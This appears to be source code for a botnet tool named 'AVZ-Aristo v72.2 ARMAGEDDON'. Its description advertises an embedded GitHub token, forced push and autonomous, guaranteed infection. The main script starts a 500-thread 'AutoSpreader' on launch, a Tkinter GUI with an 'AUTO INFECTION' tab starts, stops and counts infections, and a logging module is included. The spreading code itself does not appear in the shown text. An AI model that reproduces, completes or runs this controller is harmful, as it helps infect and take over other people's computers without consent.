description: Вшит GitHub токен, принудительный push, гарантированный запуск заражений, полная автономность

files.main.py:
from gui.app import AVZApp
from botnet.auto_spreader import AutoSpreader
from utils.logger import logger

def main():
    print('🚀 Запуск AVZ-Aristo...')
    logger.info('Starting AVZ-Aristo')
    spreader = AutoSpreader(threads=500)
    spreader.start()  # заражения сразу
    app = AVZApp(spreader)
    app.mainloop()

if __name__ == '__main__':
    main()

import tkinter as tk
from tkinter import ttk
from gui.tabs.bot_auto_tab import BotAutoTab
from utils.logger import logger

class AVZApp(tk.Tk):
    def __init__(self, spreader):
        super().__init__()
        self.title('AVZ-Aristo v72.2 ARMAGEDDON')
        self.geometry('1100x700')
        notebook = ttk.Notebook(self)
        notebook.pack(fill='both', expand=True)
        notebook.add(BotAutoTab(notebook, spreader), text='🧟 Infection')
        logger.info('GUI initialized')
files.gui/tabs/bot_auto_tab.py:
import tkinter as tk
from tkinter import ttk
import threading
from botnet.auto_spreader import AutoSpreader
from utils.logger import logger

class BotAutoTab(ttk.Frame):
    def __init__(self, parent, spreader):
        super().__init__(parent)
        self.spreader = spreader
        self.status_var = tk.StringVar(value='Running' if spreader.running else 'Stopped')
        self.count_var = tk.StringVar(value='Infected: 0')
        self.create_widgets()
        self.update_display()

    def create_widgets(self):
        ttk.Label(self, text='AUTO INFECTION', font=('Arial', 14, 'bold')).pack(pady=5)
        btn_frame = ttk.Frame(self)
        btn_frame.pack(pady=5)
        ttk.Button(btn_frame, text='START', command=self.start).pack(side='left', padx=2)
        ttk.Button(btn_frame, text='STOP', command=self.stop).pack(side='left', padx=2)
        ttk.Label(self, textvariable=self.status_var).pack()
        ttk.Label(self, textvariable=self.count_var).pack()
        self.log_box = tk.Text(self, height=15, width=90, state='disabled')
        self.log_box.pack(padx=5, pady=5, fill='both', expand=True)

    def start(self):
        if not self.spreader.running:
            self.spreader.running = True
            threading.Thread(target=self.spreader.start, daemon=True).start()
            self.status_var.set('Running')
            logger.info('Spread started via GUI')

    def stop(self):
        self.spreader.stop()
        self.status_var.set('Stopped')

    def update_display(self):
        self.count_var.set(f'Infected: {self.spreader.bot_count}')
        recent = logger.get_recent(10)
        self.log_box.config(state='normal')
        self.log_box.delete(1.0, tk.END)
        for msg in recent:
            self.log_box.insert(tk.END, msg + '\n')
        self.log_box.see(tk.END)
        self.log_box.config(state='disabled')
        self.after(1000, self.update_display)
files.utils/logger.py:
import logging
from logging.handlers import RotatingFileHandler
import sys

class AVZLogger:
    def __init__(self, logfile='avz_debug.log'):
        self.logger = logging.getLogger('AVZ')
        self.logger.setLevel(logging.DEBUG)
        formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s')
        fh = RotatingFileHandler(logfile, maxBytes=5*1024*1024, backupCount=3)
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(formatter)
        ch = logging.StreamHandler(sys.stdout)
        ch.setLevel(logging.INFO)
        ch.setFormatter(formatter)
        self.logger.addHandler(fh)
        self.logger.addHandler(ch)
        self._recent = []

    def _store(self, level, msg):
        self.logger.log(level, msg)
        self._recent.append(msg)
        if len(self._recent) > 200:
            self._recent.pop(0)

    def debug(self, msg): self._store(logging.DEBUG, msg)
    def info(self, msg): self._store(logging.INFO, msg)
    def warning(self, msg): self._store(logging.WARNING, msg)
    def error(self, msg): self._store(logging.ERROR, msg)
    def get_recent(self, n=50): return self._recent[-n:]

logger = AVZLogger()
